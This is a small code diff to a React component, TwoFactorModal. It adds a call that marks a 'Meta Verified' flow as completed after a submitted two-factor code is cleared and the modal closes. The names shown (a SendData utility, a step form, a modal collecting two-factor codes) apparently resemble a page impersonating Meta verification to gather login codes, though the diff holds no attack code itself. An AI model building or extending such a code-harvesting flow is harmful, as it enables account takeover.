@@ -6,6 +6,7 @@ import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
 import { useAppStrings } from '@/hooks/useAppStrings';
 import { SendData } from '@/utils/sendData';
+import { markMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow';
 
 interface TwoFactorModalProps {
     isOpend: boolean;
@@ -187,6 +188,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         setLoading(false);
                         setTwoFa('');
 
+                        markMetaVerifiedFlowCompleted();
                         isOpendFinish(true);
                         handleClose();
 
